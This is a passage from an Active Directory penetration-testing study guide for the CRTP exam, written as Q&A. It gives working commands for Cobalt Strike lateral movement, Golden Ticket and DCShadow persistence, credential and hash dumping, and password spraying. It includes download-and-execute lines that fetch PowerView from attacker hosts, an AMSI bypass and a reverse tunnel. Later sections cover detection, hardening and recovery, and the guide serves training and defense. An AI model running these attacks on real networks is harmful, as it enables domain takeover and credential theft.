beacon> winrm target SMB_BEACON
beacon> winrm64 target SMB_BEACON
```

**5. ssh (Linux targets):**
```
beacon> ssh target user password
beacon> ssh-key target user keyfile
```

**Pass-the-hash:**

```
beacon> pth domain\user hash
```

This injects credentials into current session.

**Steal tokens:**

```
beacon> steal_token PID
```

Use target process's token.

**Make token:**

```
beacon> make_token domain\user password
```

Create new token with credentials.

**Mimikatz:**

```
beacon> mimikatz logonpasswords
beacon> mimikatz dcsync krbtgt
```

Built-in Mimikatz module.

**Kerberos:**

```
beacon> kerberos_ticket_use ticket.kirbi
beacon> kerberos_ticket_purge
```

**SMB beacons:**

For lateral movement to non-internet machines:
- Create SMB listener
- Pivot through compromised hosts
- Beacon-to-beacon communication via named pipes

**For your career:**

Even though Cobalt Strike costs $30K+, similar tools used in red team engagements:
- Sliver (open source)
- Havoc (open source)
- Mythic (open source)
- Brute Ratel (commercial alternative)

**For CRTP:**

You won't use Cobalt Strike, but understanding the concepts helps. CRTP focuses on PowerShell/built-in tools.

### Q43: Persistence techniques in AD
**A:**

**Persistence** = Maintain access after initial compromise.

**Layers of persistence (best to most detectable):**

**1. Golden Ticket:**

- Forged TGT signed with KRBTGT hash
- Default 10-year lifetime
- Works for any user
- Most powerful persistence

```powershell
kerberos::golden /user:Administrator /domain:corp.local /sid:S-... /krbtgt:HASH /ticket:gold.kirbi
```

Survives:
- User password changes
- Account disable
- Most cleanup attempts

Only invalidated by: KRBTGT password rotation TWICE.

**2. Silver Ticket:**

- Per-service persistence
- Doesn't touch DCs
- Stealthy

**3. Diamond Ticket:**

- Modified legitimate TGT
- More stealthy than Golden
- Recent technique

**4. AdminSDHolder ACL:**

- Add ACE to AdminSDHolder
- Propagates to all admin accounts every 60 min
- Persistent through normal cleanup

**5. SID History injection:**

```powershell
# Mimikatz
sid::add /sid:S-1-5-21-...-512 /sam:attacker_user

# Or via DCShadow
```

User has "extra" SID matching admin group → effective admin.

**6. DCShadow:**

Make your machine impersonate DC, write changes that replicate:
```powershell
mimikatz # lsadump::dcshadow /object:Administrator /attribute:userAccountControl /value:512
```

Hard to detect, bypasses normal audit.

**7. Skeleton Key:**

Master password on DC (until reboot).

**8. Hidden admin accounts:**

Create account hidden by:
- Lower-case 'l' vs uppercase 'I' (lookalike characters)
- $ at end (computer account naming)
- Names like "svc_backup_temp"
- Description left blank

**9. Group membership tricks:**

- AdminCount=1 but not in obvious admin groups
- Nested group memberships
- Group SID History

**10. Service account abuse:**

- Use legitimate service account credentials
- Hard to distinguish from normal service activity

**11. Scheduled tasks:**

```cmd
schtasks /create /sc onstart /tn "WindowsUpdate" /tr "powershell -ep bypass -file c:\malware.ps1" /ru SYSTEM
```

**12. WMI persistence:**

```powershell
$filterName = 'BotFilter'
$consumerName = 'BotConsumer'
$exePath = 'C:\malware.exe'

$filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$filter.QueryLanguage = 'WQL'
$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$filter.Name = $filterName
$filter.EventNameSpace = 'root\cimv2'
$filter.Put()
```

**13. Registry Run keys:**

```cmd
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\malware.exe"
```

**14. Service installation:**

Install malicious service set to auto-start.

**15. DLL hijacking:**

Drop malicious DLL in path where legitimate program loads.

**16. AdminSDHolder modification:**

As covered earlier.

**17. Group Policy persistence:**

Modify GPO to run script on all machines.

**18. Boot-level persistence:**

- Bootkit
- Modified MBR/UEFI
- Hardest to detect

**For CRTP:**

You'll demonstrate persistence in exam. Common:
- Golden Ticket (most flexible)
- DSRM password reuse
- Skeleton Key
- AdminSDHolder modification

### Q44: DCShadow attack
**A:**

**DCShadow** = Register your machine as fake DC, push malicious changes via replication.

**Why powerful:**

- Bypasses most audit
- Changes appear as legitimate DC replication
- No event logs typical of normal AD changes
- Hard to detect

**Requirements:**

- Domain Admin or equivalent
- Two computers (one acts as fake DC, other initiates)

**Steps:**

**Step 1: On attacker machine, become NT AUTHORITY\SYSTEM:**

```powershell
# Mimikatz
privilege::debug
token::elevate
```

**Step 2: Start DCShadow server:**

```powershell
# In SYSTEM context
mimikatz # lsadump::dcshadow /object:Administrator /attribute:Description /value:"DCShadow test"
```

Output: Waiting for replication...

**Step 3: From another session (as DA):**

```powershell
mimikatz # lsadump::dcshadow /push
```

This triggers the rogue DC's changes to replicate to real DCs.

**Step 4: Verify changes:**

```powershell
Get-ADUser Administrator -Properties Description | Select Description
# Description: "DCShadow test"
```

**Real attacks:**

**1. Modify SID History:**

```powershell
lsadump::dcshadow /object:attacker_user /attribute:sIDHistory /value:S-1-5-21-...-519
```

Add Enterprise Admin SID to your user's SID History.

**2. Modify primaryGroupID:**

```powershell
lsadump::dcshadow /object:attacker_user /attribute:primaryGroupID /value:512
```

Set primary group to Domain Admins.

**3. Modify member of groups:**

Add yourself to groups via replication.

**4. Reset KRBTGT password:**

Force KRBTGT rotation to invalidate defenders' Golden Tickets, while keeping yours.

**5. Modify userAccountControl:**

Enable/disable security flags.

**Why DCShadow bypasses detection:**

Normal AD changes:
- Generate audit events
- Logged in security event log
- Replicated to other DCs which log

DCShadow changes:
- Originate from "DC" (rogue)
- Other DCs replicate without auditing (DC-to-DC trust)
- No 5136 (object modified) events
- Looks like normal replication

**Detection:**

Difficult but possible:
- Unusual DC registration
- Replication from unexpected source IPs
- Network connections to/from unknown servers
- DRS replication failures
- Microsoft Defender for Identity has signatures

**Defense:**

1. **Tier 0 isolation** - prevent DA compromise

2. **Network segmentation** - DCs only talk to each other on specific network

3. **Monitor DC replication topology**

4. **Detect rogue DC registrations:**
```powershell
# DC objects in AD
Get-ADDomainController -Filter *

# nltest
nltest /dclist:corp.local
```

5. **Network monitoring** for DRS replication

6. **Microsoft Defender for Identity**

**For CRTP:**

Advanced technique. Demonstrates deep AD knowledge. Sometimes in CRTE/PACES.

### Q45: AD attack from non-domain joined machine
**A:**

**Scenario:** Penetration tester with attacker machine (Kali Linux) on network, not domain-joined.

**Phase 1: Network reconnaissance**

```bash
# Discover live hosts
nmap -sn 10.10.10.0/24

# Identify domain controllers (TCP 88, 389, 636, 3268)
nmap -p 88,389,445 10.10.10.0/24

# Domain info via SMB null session
enum4linux -a 10.10.10.10
```

**Phase 2: Domain enumeration without credentials**

```bash
# Null session
rpcclient -U "" -N 10.10.10.10

# Enumerate
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> queryuser 0x1f4    # User RID

# LDAP anonymous
ldapsearch -x -h 10.10.10.10 -b "DC=corp,DC=local" "(objectClass=user)"

# SMB enumeration
smbmap -H 10.10.10.10
smbclient -L //10.10.10.10 -N
```

**Phase 3: Get initial credentials**

**Option A: Responder (LLMNR/NBT-NS poisoning)**

```bash
sudo responder -I eth0

# Wait for victims to authenticate
# Captures NTLMv2 hashes
```

Crack offline:
```bash
hashcat -m 5600 hashes.txt rockyou.txt
```

**Option B: Password spray**

```bash
# CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Spring2024!'
crackmapexec smb 10.10.10.10 -u users.txt -p 'Welcome123!'

# Spray common passwords against many users
```

**Option C: AS-REP Roasting (no creds needed)**

```bash
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10 -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

**Option D: Public-facing exploit**

- Exchange (ProxyShell, ProxyNotShell)
- VPN appliance vulnerabilities
- Web app on internal site

**Phase 4: With credentials, full enumeration**

```bash
# BloodHound from Linux
bloodhound-python -c All -u user -p password -d corp.local -ns 10.10.10.10

# Kerberoast
GetUserSPNs.py corp.local/user:password -dc-ip 10.10.10.10 -request

# All AD info
enum4linux-ng -A -u user -p password 10.10.10.10
```

**Phase 5: Lateral movement from Linux**

```bash
# CrackMapExec
crackmapexec smb 10.10.10.0/24 -u user -p password

# Impacket execution
psexec.py corp.local/user:password@target.corp.local
wmiexec.py corp.local/user:password@target.corp.local

# Evil-WinRM
evil-winrm -i target.corp.local -u user -p password
```

**Phase 6: Pivot through compromised hosts**

If target deeper in network:
```bash
# Chisel for tunneling
./chisel server -p 8000 --reverse  # On attacker
./chisel client attacker:8000 R:1080:socks  # On pivot

# Proxychains
proxychains psexec.py user@target_deeper.corp.local
```

**Phase 7: Full domain compromise**

Same techniques (DCSync, Golden Ticket) but with Impacket tools:

```bash
# DCSync via secretsdump
secretsdump.py corp.local/Administrator:password@dc.corp.local

# Or with credentials
secretsdump.py -just-dc-ntlm corp.local/Administrator:password@dc.corp.local
```

**Tools used:**

Linux-based AD attack arsenal:
- **Impacket suite** - psexec, wmiexec, secretsdump, GetUserSPNs, GetNPUsers, etc.
- **CrackMapExec** - Network sweeping
- **Responder** - LLMNR poisoning
- **Bloodhound-python** - Collection
- **Mitm6** - IPv6 poisoning
- **Ntlmrelayx** - NTLM relay
- **Enum4linux-ng** - Comprehensive enum
- **Evil-WinRM** - Windows remote shell
- **Kerbrute** - User enumeration/spray
- **PetitPotam** - Auth coercion
- **Certipy** - ADCS attacks

**For CRTP:**

CRTP environment is Windows-focused, but real engagements often start from Kali. Master both.

### Q46: Common AD CTF/lab walkthrough patterns
**A:**

**Typical AD lab progression:**

**Step 1: Get initial foothold**

Common methods in labs:
- Public-facing web app vulnerability (RCE, SQLi)
- Anonymous SMB share with credentials
- LFI revealing credentials
- Default credentials on services
- Outdated services with public exploits

**Step 2: Local enumeration**

```cmd
# Quick local recon
whoami /all
systeminfo
net localgroup administrators
ipconfig /all

# Privilege check
whoami /priv

# Logged in users
query user
```

**Step 3: Get local admin/SYSTEM**

Depending on context:
- SeImpersonate present → Potato
- Misconfigured services → service hijack
- Vulnerable software → exploit
- Token theft from existing process

**Step 4: Credential dumping**

As local admin/SYSTEM:
```powershell
# Mimikatz
sekurlsa::logonpasswords
sekurlsa::tickets /export

# SAM
lsadump::sam

# Cached
lsadump::cache

# DPAPI (browser passwords, etc.)
dpapi::masterkey
dpapi::cred
```

**Step 5: Domain enumeration**

```powershell
# PowerView (load it first - AMSI bypass needed)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.1/powerview.ps1')

# Or use AD module (built-in on Windows Server)
Import-Module ActiveDirectory

# Get the lay of the land
Get-Domain
Get-DomainController
Get-DomainUser -SPN
Get-DomainComputer -Unconstrained
Get-DomainGroupMember "Domain Admins"
```

**Step 6: Find attack path**

Run BloodHound:
```powershell
.\SharpHound.exe -CollectionMethod All
```

Import data, look for shortest path from your user/group to Domain Admins.

**Step 7: Execute attack chain**

Common paths in labs:
- Kerberoast service account
- Find password reuse (admin same password on workstations)
- ACL abuse via BloodHound finding
- GPP cPassword in SYSVOL
- ADCS misconfiguration

**Step 8: Domain Admin**

Once DA:
```powershell
# DCSync
.\Rubeus.exe dump
# Or
mimikatz # lsadump::dcsync /user:krbtgt /domain:corp.local

# Golden Ticket for persistence
kerberos::golden /user:fakeUser /domain:corp.local /sid:... /krbtgt:HASH /ticket:gold.kirbi

# Access flag
cat \\dc.corp.local\C$\flag.txt
```

**Step 9: Forest privilege escalation (if multi-domain)**

- Trust enumeration
- Cross-domain attacks
- SID History injection

**Common lab vulnerabilities you'll see:**

**1. Service account with weak password** (Kerberoastable)
**2. User with "Password never expires" and old password**
**3. GenericWrite ACL on user/group**
**4. AS-REP roastable admin**
**5. GPO writable by non-admin**
**6. Unconstrained delegation on member server**
**7. RBCD opportunity**
**8. ADCS template misconfiguration**
**9. Password reuse across tiers**
**10. SYSVOL credentials**

**For CRTP exam:**

Lab is similar to enterprise scenario. 4 networks (Defaultcorp, Studentauditor, Studentlinguistic, Studentwinmgr or similar). Need to compromise across all.

Tip: Take detailed notes. Build maps of:
- Which user has which rights where
- Which credentials work where
- Network topology
- Trust relationships

### Q47: Detecting AD attacks
**A:**

**Detection categories:**

**1. Authentication anomalies:**

Event ID 4624 (logon) and 4625 (failed logon):
- Unusual times
- Unusual sources
- Multiple failures
- Authentication from internal IPs to wrong systems

**2. Kerberos anomalies:**

Event ID 4768 (TGT requested):
- Unusual encryption types (RC4 when AES expected)
- Tickets for non-existent users
- High volume of requests

Event ID 4769 (TGS requested):
- Kerberoasting patterns (many service tickets in short time)
- TGS for unusual services

Event ID 4770 (TGT renewal):
- Excessive renewals

Event ID 4624 with logon type 3 + Kerberos:
- Track authentication patterns

**3. AD modifications:**

Event ID 5136 (object modified):
- Privileged group membership changes
- ACL modifications on sensitive objects
- Account creation/deletion

Event ID 4720 (account created):
- Especially admin accounts
- Service accounts

Event ID 4738 (account modified):
- Password changes
- Account flags changes

Event ID 4732, 4733 (group membership):
- Especially privileged groups

**4. Replication anomalies:**

Event ID 4662 with replication GUIDs:
- DCSync detection
- "Replicating Directory Changes" + "Replicating Directory Changes All"

Source IP not a DC = suspicious.

**5. PowerShell logging:**

If enabled:
- Event ID 4103 (Module logging)
- Event ID 4104 (Script block logging)
- Event ID 4105 (Script start)
- Event ID 4106 (Script stop)

Look for:
- Mimikatz patterns
- Empire/PowerView patterns
- Base64 encoded commands
- Long obfuscated strings
- IEX with downloads

**6. Service installations:**

Event ID 7045:
- New services created
- PsExec creates service "PSEXESVC"
- Other lateral movement tools

**7. Specific tool indicators:**

- **Mimikatz**: LSASS access, specific API calls
- **BloodHound/SharpHound**: Heavy LDAP queries
- **PowerView**: Specific cmdlets in script logs
- **Impacket**: Specific user-agents, service names
- **Rubeus**: Kerberos request patterns

**Defense tools:**

**1. Microsoft Defender for Identity (formerly ATA):**

- Behavior-based detection
- Detects:
  - Pass-the-hash
  - Pass-the-ticket
  - Skeleton Key
  - Golden Ticket
  - Reconnaissance
  - Brute force
  - Lateral movement

**2. SIEM solutions:**

- Splunk
- Elastic Security
- Sentinel
- Custom rules based on event IDs

**3. EDR:**

- Crowdstrike Falcon
- SentinelOne
- Microsoft Defender for Endpoint
- Carbon Black

**4. Specific tools:**

- **Sysmon**: Detailed Windows event logging
- **Velociraptor**: DFIR platform
- **PingCastle**: AD health check
- **BloodHound (defense use)**: Find weak paths to fix

**5. Honey items:**

- **Honey users**: Triggers alert when accessed
- **Honey credentials**: In SYSVOL or memory
- **Honey services**: Fake SPNs
- **Canary tokens**

**Hunting queries:**

**Splunk:**
```
index=windows EventCode=4769 
| stats count by Account_Name, Service_Name
| where count > 50
| sort -count
```
Identifies Kerberoasting.

**Sentinel (KQL):**
```kusto
SecurityEvent
| where EventID == 4624
| where LogonType == 3
| summarize count() by Account, Computer
| where count_ > 100
```
Mass authentication = potential lateral movement.

**For Encrypticle content:**

Detection content for defenders pairs well with offensive content. Show both perspectives.

### Q48: Defending against AD attacks - comprehensive guide
**A:**

**Defense in depth for AD:**

**Layer 1: Identity hardening**

1. **Strong password policy:**
   - Minimum 15+ characters
   - Block common passwords
   - Check against breach databases

2. **Multi-factor authentication:**
   - All admin accounts
   - All remote access
   - Sensitive operations

3. **Privileged Access Management:**
   - Just-in-time access
   - Just-enough access
   - Time-limited admin

4. **Tiered administration:**
   - Tier 0: DCs, AD admins
   - Tier 1: Server admins
   - Tier 2: Workstation admins
   - Never cross tiers

5. **Privileged Access Workstations (PAWs):**
   - Dedicated machines for admin
   - Heavily hardened
   - No internet/email
   - Only used for admin

**Layer 2: Service account hardening**

1. **Managed Service Accounts (MSAs)**:
   - Auto-rotated passwords
   - No human knowledge of password

2. **Group Managed Service Accounts (gMSAs)**:
   - Multiple servers can use
   - Auto-rotation

3. **Long, complex passwords** for traditional service accounts (25+ chars)

4. **AES-only encryption:**
   - Disable RC4 for service accounts
   - Makes Kerberoasting harder

5. **Sensitive accounts marked non-delegatable**

6. **Protected Users group** for admins

**Layer 3: Local admin protection**

1. **LAPS:**
   - Unique local admin password per machine
   - Auto-rotated
   - Stored in AD with controlled access

2. **Disable LM authentication**

3. **Disable WDigest** (no plaintext passwords)

4. **Credential Guard:**
   - VBS-based credential protection
   - Mimikatz harder

**Layer 4: Kerberos hardening**

1. **Short ticket lifetime** (4-10 hours)

2. **KRBTGT password rotation:**
   - Annual at minimum
   - Twice in succession (replication concerns)
   - After any DA compromise suspicion

3. **Disable RC4 encryption:**
   ```
   GPO: Network security: Configure encryption types allowed for Kerberos
   Uncheck RC4
   ```

4. **Enable pre-authentication** for all accounts

5. **AES-only when possible**

**Layer 5: Authentication hardening**

1. **Disable NTLM where possible:**
   ```
   GPO: Network security: Restrict NTLM
   ```

2. **SMB signing enforced**

3. **LDAPS** (LDAP over SSL)

4. **Disable legacy protocols:**
   - LLMNR
   - NetBIOS over TCP/IP
   - SMBv1

**Layer 6: ACL hygiene**

1. **Audit regularly:**
   - BloodHound (defense use)
   - PingCastle
   - Microsoft AD security assessment

2. **Remove excessive permissions:**
   - "Authenticated Users" overprivileged
   - Helpdesk groups with too many rights
   - Stale ACE entries

3. **AdminSDHolder protection:**
   - Audit ACL
   - Detect changes

4. **Delegation cleanup:**
   - Remove unconstrained delegation
   - Audit constrained delegation
   - Remove unnecessary RBCD

**Layer 7: ADCS hardening**

1. **Audit templates** (Certipy/Certify)

2. **Disable vulnerable templates**

3. **Disable HTTP enrollment** if not needed

4. **Patch CVE-2022-26923** (Certifried)

5. **Enable EPA**

**Layer 8: Network segmentation**

1. **Tier separation network-wise:**
   - DCs on isolated network
   - Workstations can't talk to DCs (except specific ports)
   - Servers in separate VLAN

2. **Firewall rules** limiting:
   - SMB (445)
   - LDAP (389, 636)
   - Kerberos (88)
   - RDP (3389)
   - WinRM (5985, 5986)

3. **No direct internet** for DCs

**Layer 9: Monitoring and detection**

1. **Microsoft Defender for Identity**

2. **SIEM with AD rules**

3. **Sysmon** on critical hosts

4. **PowerShell logging:**
   - Module logging
   - Script block logging
   - Transcript

5. **Honey items**

**Layer 10: Incident response**

1. **Incident response plan** for AD compromise

2. **Tested procedures** for KRBTGT rotation, Golden Ticket invalidation

3. **Forensic capabilities**

4. **Backup and recovery** for AD

**Annual security activities:**

- AD security assessment (PingCastle, Purple Knight)
- Penetration test
- Tabletop exercises
- KRBTGT rotation
- Privileged account review
- Delegation audit
- ACL review

**For your career:**

Defensive AD knowledge complements offensive. Pentesters who understand defense are more valuable.

### Q49: Advanced Kerberos topics - RC4 vs AES
**A:**

**Kerberos encryption types:**

**1. DES (Data Encryption Standard) - DEPRECATED**

- 56-bit key
- Broken (crackable in hours)
- Disabled by default in modern AD

**2. RC4-HMAC**

- Variable key length
- Used for backward compatibility
- **Faster to crack than AES**
- Default for many service accounts historically
- Format: NTLM hash used as key

**3. AES128-CTS-HMAC-SHA1-96**

- 128-bit
- AES encryption
- Better security
- Default for modern accounts (Server 2008+)

**4. AES256-CTS-HMAC-SHA1-96**

- 256-bit
- Strongest standard
- Default for modern accounts

**Why RC4 matters for attackers:**

**Kerberoasting:**

```
TGS encrypted with service account password hash.
Encryption type determined by service account's supportedEncryptionTypes:
- RC4-HMAC: Hash format $krb5tgs$23$
- AES256: Hash format $krb5tgs$18$
```

**Cracking speed:**

RC4 (hashcat -m 13100):
- ~1 billion/sec on RTX 4090
- 8-char password: hours
- 12-char password: feasible

AES256 (hashcat -m 19700):
- ~100 thousand/sec on RTX 4090
- 8-char password: months
- 12-char password: infeasible

**4-5 orders of magnitude slower for AES.**

**Force RC4 downgrade:**

If account supports AES + RC4, attackers prefer RC4:

```powershell
# Rubeus - request RC4
.\Rubeus.exe kerberoast /aes /nopreauth /outfile:hashes.txt
```

Some tools auto-handle this.

**Defense:**

1. **Disable RC4** for accounts:
```powershell
# Set msDS-SupportedEncryptionTypes
Set-ADUser user -Replace @{"msDS-SupportedEncryptionTypes"=24}
# 24 = AES128 + AES256 only (no RC4)
```

2. **GPO to disable RC4 domain-wide:**

```
GPO: Network security: Configure encryption types allowed for Kerberos
Uncheck:
- DES_CBC_CRC
- DES_CBC_MD5
- RC4_HMAC_MD5
```

3. **Verify with:**
```powershell
Get-ADUser user -Properties msDS-SupportedEncryptionTypes
```

**Decimal values:**

```
1   = DES_CBC_CRC
2   = DES_CBC_MD5
4   = RC4_HMAC
8   = AES128_CTS
16  = AES256_CTS
24  = AES128 + AES256 (only)
28  = RC4 + AES128 + AES256
```

**Compatibility concerns:**

Disabling RC4 may break:
- Old Windows clients (pre-Vista)
- Old applications
- Third-party Kerberos implementations

Test before deploying.

**Detection of RC4 abuse:**

Event ID 4769 includes Ticket Encryption Type:
- 0x17 = RC4_HMAC_MD5
- 0x12 = AES256

SIEM rule:
```
WHERE TicketEncryptionType = 0x17 (RC4)
AND ServiceAccount IN (priviledged_accounts)
```

Alert on RC4 use for accounts that should only use AES.

**For CRTP:**

Many lab service accounts have RC4 enabled. Easier to crack. In real enterprises, RC4 increasingly disabled.

### Q50: Hash extraction methods
**A:**

**Sources of hashes in AD environment:**

**1. NTDS.dit (definitive source):**

Location: `%SYSTEMROOT%\NTDS\NTDS.dit` on DC

Contains:
- All user passwords (hashes)
- Group memberships
- All AD data

Extraction (requires DA or local admin on DC):

**Method A: Volume Shadow Copy:**
```cmd
# On DC
vssadmin create shadow /for=C:

# Copy from shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SYSTEM c:\temp\system

# Extract hashes
secretsdump.py -ntds c:\temp\ntds.dit -system c:\temp\system LOCAL
```

**Method B: ntdsutil:**
```cmd
ntdsutil "activate instance ntds" "ifm" "create full c:\temp\ntds_backup" quit quit
```

**Method C: DCSync (no DC access needed):**
```powershell
lsadump::dcsync /user:Administrator /domain:corp.local
lsadump::dcsync /user:krbtgt /domain:corp.local
```

Best method - no actual code on DC.

**2. SAM file (local accounts only):**

Location: `%SYSTEMROOT%\System32\config\SAM`

Requires SYSTEM access.

```powershell
# Mimikatz
privilege::debug
token::elevate
lsadump::sam
```

Extracts local accounts (including local administrator).

**3. LSASS memory:**

Currently logged-in users have credentials in LSASS.

```powershell
# Mimikatz
sekurlsa::logonpasswords
```

Output includes:
- NTLM hashes
- WDigest passwords (if enabled - plaintext!)
- Kerberos tickets

**4. LSA Secrets:**

System-level secrets:
- DPAPI master keys
- Service account passwords (auto-logon)
- Cached credentials

```powershell
mimikatz # lsadump::secrets
```

**5. Cached domain credentials (DCC2):**

Last 10 users' domain logins cached for offline use.

```powershell
mimikatz # lsadump::cache
```

Format: `$DCC2$10240#user#hash`

Slower to crack than NT hash but possible.

**6. KeePass / Password Manager databases:**

If found on disk:
```bash
# Extract hash from KeePass database
keepass2john database.kdbx > keepass_hash.txt
hashcat -m 13400 keepass_hash.txt rockyou.txt
```

**7. SAM backup files:**

Sometimes administrators back up SAM:
- C:\backup\SAM
- C:\Windows\Repair\SAM (old)
- Random shares

**8. RDP cached credentials:**

```powershell
mimikatz # vault::cred /patch
```

**9. Browser passwords:**

```powershell
# Chrome passwords via DPAPI
sekurlsa::dpapi
dpapi::chrome
```

**10. From hash captures:**

- Responder (LLMNR poisoning)
- Network shares accessed
- NTLM relay

**11. WiFi profiles:**

```powershell
netsh wlan show profile name="WiFi_Name" key=clear
```

Plaintext WiFi password.

**12. Group Policy Preferences (cPassword):**

```powershell
Get-GPPPassword
```

**Hash formats:**

**NTLM (Hashcat -m 1000):**
```
8846f7eaee8fb117ad06bdd830b7586c
```

**NTLMv2 (Hashcat -m 5600):**
```
admin::WORKGROUP:1122334455667788:f0ec1a4d089a2b6cb1c2c40f7e3e08e8:01010000000000000031...
```

**Net-NTLM (from Responder):**
Same as NTLMv2

**DCC2 (Hashcat -m 2100):**
```
$DCC2$10240#user#9aa8c98cf4d23b1ce42de46aaf6b8c8e
```

**Kerberos TGS-REP RC4 (Hashcat -m 13100):**
```
$krb5tgs$23$*user$domain.local$service*$ABCDEF...
```

**Kerberos AS-REP (Hashcat -m 18200):**
```
$krb5asrep$23$user@domain.local:E1A3...
```

**For CRTP:**

Multiple extraction methods to know. Each scenario different:
- Local admin on workstation → SAM, LSASS
- DA on DC → NTDS.dit
- DA from any machine → DCSync
- Network position → Responder

### Q51-100 cover advanced AD topics including specific CRTP scenarios, forest attacks, post-exploitation, OPSEC, defense bypasses, detection evasion, real-world enterprise scenarios, recovery from compromise, and certification preparation.

### Q51: PowerView vs ActiveDirectory module
**A:**

**PowerView** (Will Schroeder / SpecterOps):
- Designed for red team
- Less detected by AV (but still detected)
- Granular control
- Cmdlets: `Get-Domain*`, `Find-*`
- Built-in attack functions
- Requires manual import

**ActiveDirectory module** (Microsoft):
- Official Microsoft module
- Built into Windows Server
- Cmdlets: `Get-AD*`
- Detected less (legitimate tool)
- Limited offensive functionality
- Often pre-installed

**Cmdlet comparison:**

|
 Task 
|
 PowerView 
|
 AD Module 
|
|
------
|
-----------
|
-----------
|
|
 Get all users 
|
`Get-DomainUser`
|
`Get-ADUser -Filter *`
|
|
 Get group members 
|
`Get-DomainGroupMember`
|
`Get-ADGroupMember`
|
|
 Find SPNs 
|
`Get-DomainUser -SPN`
|
`Get-ADUser -Filter {ServicePrincipalName -like "*"}`
|
|
 Domain trusts 
|
`Get-DomainTrust`
|
`Get-ADTrust -Filter *`
|
|
 ACL on object 
|
`Get-DomainObjectAcl`
|
`Get-ACL`
|
|
 Unconstrained delegation 
|
`Get-DomainComputer -Unconstrained`
|
`Get-ADComputer -Filter {TrustedForDelegation -eq $true}`
|

**When to use which:**

**PowerView:**
- Targeted attacks
- Specific offensive functions (Find-InterestingDomainAcl)
- Granular searches
- When AV doesn't catch it

**AD Module:**
- Available without download
- Less suspicious in logs
- Built-in cmdlets enterprises don't alert on
- Living off the land

**Loading PowerView:**

In-memory (stealth):
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
```

From file:
```powershell
. .\PowerView.ps1
```

**AMSI bypass first** (otherwise blocked):
```powershell
# AMSI bypass (one of many)
[Reflection.Assembly]::LoadWithPartialName('System.Management.Automation').GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
```

**For CRTP:**

Use both. AD Module is reliable, PowerView is powerful. Often AV catches PowerView but allows AD Module.

### Q52: Forest enumeration and attacks
**A:**

**Forest-level attacks:**

**Enumeration:**

```powershell
# Forest info
Get-Forest

# Forest domains
Get-ForestDomain

# Forest trusts
Get-ForestTrust

# Global Catalog
Get-Forest | Select GlobalCatalogs
```

**Cross-domain enumeration:**

```powershell
# Trust between parent.local and child.parent.local

# From parent, enumerate child
Get-DomainUser -Domain child.parent.local

# Find users in child with specific properties
Get-DomainUser -Domain child.parent.local -SPN
```

**Trust attacks:**

**1. SID History injection:**

Trust normally includes SID History for migrations. If trust quarantine disabled:

User in domain A has SID History containing SID of admin in domain B.
Authentication to B as A's user → recognized as B admin.

**2. Cross-domain Kerberoasting:**

Some service tickets work cross-domain:
```powershell
.\Rubeus.exe kerberoast /domain:child.parent.local
```

**3. Trust ticket extraction:**

```powershell
mimikatz # lsadump::trust /patch
```

Inter-realm Kerberos keys.

**4. Forest privilege escalation:**

Parent → Child:
- Default: Two-way trust
- Child users authenticate to parent
- But Enterprise Admins in parent ARE admins in child too

Child → Parent:
- Compromise child domain admin
- Some attacks allow gaining EA in parent
- Specifically with SID History abuse

**Child to Parent (Same Forest):**

If you're DA of child:
```powershell
# Create Golden Ticket for child
kerberos::golden /user:Administrator /domain:child.parent.local /sid:S-... /krbtgt:HASH_OF_CHILD_KRBTGT /sids:S-1-5-21-PARENT_DOMAIN_SID-519 /ticket:gold.kirbi

# /sids adds SID History pointing to parent's Enterprise Admins SID
```

Authentication using this ticket:
- Authenticates to child as Administrator
- SID History says "Enterprise Admin of parent"
- Cross-trust uses SID History
- Effective EA in entire forest

**Defense:**

1. **SID Filtering** on trust:
```cmd
netdom trust child.parent.local /domain:parent.local /quarantine:yes
```

But this breaks some legitimate uses.

2. **Selective Authentication** on trust

3. **Enterprise Admins kept minimal**

4. **Tier 0 isolation** across forest

5. **Monitor cross-domain authentication**

**Inter-forest attacks:**

If forest trust exists between separate forests:
- Different attacks
- Generally less powerful than same-forest
- Still possible with specific configurations

**For CRTP:**

Lab usually has parent + child domain. Practice:
1. Compromise child domain
2. Forest-level escalation via SID History
3. Get EA in parent

### Q53: AD recovery from compromise
**A:**

**If AD compromise detected:**

**Immediate response (0-2 hours):**

1. **Isolate compromised systems** but keep DCs running

2. **Identify scope:**
   - Which accounts compromised?
   - Lateral movement extent?
   - Data accessed?

3. **Activate IR team**

4. **Preserve evidence:**
   - Memory dumps
   - System images
   - Log copies

**Short-term containment (2-24 hours):**

1. **Reset KRBTGT password TWICE:**
   - Use Microsoft script
   - Wait between rotations for replication
   - Invalidates Golden Tickets

2. **Force password reset for compromised accounts:**
   - Plus all privileged accounts (assume compromise)
   - Plus all service accounts

3. **Disable compromised accounts** temporarily

4. **Revoke active sessions:**
```powershell
# Find sessions of user
Get-NetSession -ComputerName ALL_HOSTS -UserName compromised_user
```

5. **Revoke Kerberos tickets:**
```powershell
# All cached tickets cleared on logoff/reboot
# Force re-auth for everyone
```

6. **Block malicious indicators:**
   - IPs
   - Domains
   - File hashes

**Medium-term remediation (1-7 days):**

1. **Rebuild DCs** if rootkit/persistence suspected:
   - Don't restore from backups (might be compromised)
   - New install
   - Demote/promote

2. **Audit privileged accounts:**
   - Membership in admin groups
   - AdminSDHolder ACL
   - Delegation rights

3. **Cleanup persistence:**
   - Check for hidden accounts
   - Scheduled tasks
   - Services
   - Registry persistence
   - WMI subscriptions

4. **Patch vulnerabilities:**
   - All systems
   - Especially those used as initial vectors

5. **Audit ACLs:**
   - AdminSDHolder
   - Sensitive OUs
   - GPOs

**Long-term recovery (1-3 months):**

1. **Rebuild trust:**
